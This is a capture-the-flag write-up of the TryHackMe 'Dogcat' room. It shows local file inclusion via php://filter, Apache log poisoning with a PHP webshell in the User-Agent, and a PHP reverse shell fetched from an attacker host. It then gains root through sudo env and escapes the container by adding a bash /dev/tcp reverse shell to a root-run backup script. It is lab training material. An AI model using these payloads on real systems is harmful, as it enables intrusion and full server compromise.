## Dogcat
https://tryhackme.com/room/dogcat

### 🐱LFI
![image](https://user-images.githubusercontent.com/6504854/178409135-be838f83-3c81-49e5-a9bd-09425ff297c3.png)

```
http://10.10.115.184/?view=cat
```
🏴Parameter view has LFI vuln.

![image](https://user-images.githubusercontent.com/6504854/178409588-ff48baf4-166f-49f1-8914-46d843522d29.png)
🏴We need some bypasses.

```
Wrapper php://filter
The part "php://filter" is case insensitive

http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```
![image](https://user-images.githubusercontent.com/6504854/178411232-37dbd3d1-6d30-429f-a29f-fd3352326d8e.png)

```
http://10.10.115.184/?view=php://filter/cat/convert.iconv.utf-8.utf-16/cat/resource=index
```
```
<!DOCTYPE HTML> 
<html> 
<head> 
<title>dogcat</title> 
<link rel="stylesheet" type="text/css" href="/style.css"> 
</head> 
<body> 
<h1>dogcat</h1> 
<i>a gallery of various dogs or cats</i> 
<div> 
<h2>What would you like to see?</h2> 
<a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br> 
<?php 
function containsStr($str, $substr) 
{ return strpos($str, $substr) !== false; } 
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php'; 
if(isset($_GET['view'])) { if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) 
{ echo 'Here you go!'; include $_GET['view'] . $ext; } 
else 
{ echo 'Sorry, only dogs or cats are allowed.'; } } 
?> 
</div> 
</body> 
</html>
```
```
http://10.10.115.184/?view=cat&ext=../../../../../etc/hosts
```
![image](https://user-images.githubusercontent.com/6504854/178411812-3fe33674-fc30-4663-9492-4b5779eda7c7.png)

```
http://10.10.115.184/?view=cat=index&ext=../../../../../var/log/apache2/access.log
```
![image](https://user-images.githubusercontent.com/6504854/178412047-dcc03195-1880-4dbd-bcc8-389b215c0ae6.png)

```
curl http://10.10.115.184 -A "<?php system(\$_GET['cmd']);?>"
```
```
http://10.10.115.184/?view=cat=index&ext=../../../../../var/log/apache2/access.log&cmd=id
```
![image](https://user-images.githubusercontent.com/6504854/178412749-5c62c0e2-d1d4-4404-b95e-f5dcb9f750d0.png)

🏴OK, we injected RCE via Apache log file. How we can upload Rev-Shell Mumumu....


### 🐱Flag
```
python3 -m http.server 8000
```

1.php is PHP Rev-Shell.connect to 4444
```
curl http://10.10.115.184 -A "<?php file_put_contents('1.php',file_get_contents('http://10.10.10.10:8000/1.php'));?>"
```
```
nc -lnvp 4444
```
```
curl http://10.10.115.184/1.php
```
```
connect to [10.10.10.10] from (UNKNOWN) [10.10.115.184] 52856
Linux 559a947c9282 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 06:33:17 up  2:21,  0 users,  load average: 0.00, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')";
sh: 1: python3: not found
$ sudo -l
Matching Defaults entries for www-data on 559a947c9282:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 559a947c9282:
    (root) NOPASSWD: /usr/bin/env
$ sudo /usr/bin/env /bin/sh
whoami
root
find / -name '*flag*.txt' 2>/dev/null
/var/www/flag2_QMW7JvaY2LvK.txt
/root/flag3.txt
cat /var/www/flag2_QMW7JvaY2LvK.txt
THM{***_**_***_******}
cat /root/flag3.txt
THM{*********_************_******}
ls /var/www
flag2_QMW7JvaY2LvK.txt
html
ls /var/www/html
1.php
cat.php
cats
dog.php
dogs
flag.php
index.php
style.css
cat /var/www/html/flag.php
<?php
$flag_1 = "THM{****_**_***_*_******_********}"
?>
```

Where is the last flag? 
```
cd /opt
ls
backups
ls -la backups
total 2892
drwxr-xr-x 2 root root    4096 Apr  8  2020 .
drwxr-xr-x 1 root root    4096 Jul 12 04:13 ..
-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
-rw-r--r-- 1 root root 2949120 Jul 12 06:44 backup.tar
cd backups
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container

tar -tvf backup.tar
drwxr-xr-x root/root         0 2020-03-10 20:52 root/container/
-rw-r--r-- root/root       733 2020-03-10 20:24 root/container/Dockerfile
~
-rw-r--r-- root/root        51 2020-03-06 19:31 root/container/src/cat.php
```

Need another shell?

```
nc -lnvp 8888
```

```
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/8888 0>&1'" >> /opt/backups/backup.sh
```

```
listening on [any] 8888 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.115.184] 34516
bash: cannot set terminal process group (21629): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
```
Dockerのとこコピペでわからん？containerの中にあったってこと？

🐱 🐶 Thank you for your time. I am happy for some your inspiration. 🐱 🐶
